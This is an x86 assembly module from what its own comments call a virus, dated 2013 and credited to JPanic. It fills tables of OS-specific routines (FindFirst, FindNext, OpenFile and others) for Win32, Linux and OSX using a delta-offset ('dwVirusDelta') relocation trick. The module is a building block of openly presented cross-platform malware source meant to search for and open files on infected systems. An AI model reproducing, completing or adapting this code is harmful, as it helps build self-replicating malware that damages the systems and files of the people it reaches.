;= Implement Tables of OS Specific functions (c) 2013 JPanic ===============
;
; Supported OS Functions:
;	Init, FindFirst, FindNext, FindClose, OpenFile, CloseFile, Exit
;
; Supported OS's:
;	Win32, Linux, OSX.
;
; PUBLICS:
;	dword Win32_Proc_Table[]
;	dword Linux_Proc_Table[]
;	dword OSX_Proc_Table[]
;	dword Cur_Proc_Table
;	Fill_Proc_Table()
;
;- Directive Warez --------------------------------------------------------
_OSPROCS_ASM	EQU 	TRUE

include osprocs.ash
include vheap.ash
include vmain.ash
	
	.486
	.model	flat
	locals @@
	
;= Code Warez =============================================================
        include codeseg.ash
;= Virus Procedure Address Encoding =======================================
VPROC	MACRO	ProcAddr

	extrn &ProcAddr&:PROC
	dd	(offset ProcAddr - VCode)
	org	$-2	
ENDM
	
;= Fill_Proc_Table ========================================================
;
; Outputs:
;	None.
;
;--------------------------------------------------------------------------
PUBLIC	Fill_Proc_Table
PUBLIC  OS_Proc_Switch
Fill_Proc_Table		PROC
			push	L OSProcCount
			pop	ecx
                        call    @@skip
                                ; Win32 List - Offset 0
                                OS_PROC_LIST	<<VPROC Win32_!&_procname!&>>
                                ; Linux List
                                OS_PROC_LIST	<<VPROC Linux_!&_procname!&>>
				; OSX List
                                OS_PROC_LIST	<<VPROC OSX_!&_procname!&>>
        @@skip:         pop     esi
                        add     esi,?
                        org     $-1
        OS_Proc_Switch  db      OS_Proc_Use_Win32
			lea	edi,[vheap.VProcList]
			@@cl:	xor	eax,eax
				lodsw
				add	eax,[vheap.dwVirusDelta]
				stosd
			loop	@@cl
			ret			
Fill_Proc_Table		ENDP

;==========================================================================
                        ENDS
                        END
;==========================================================================




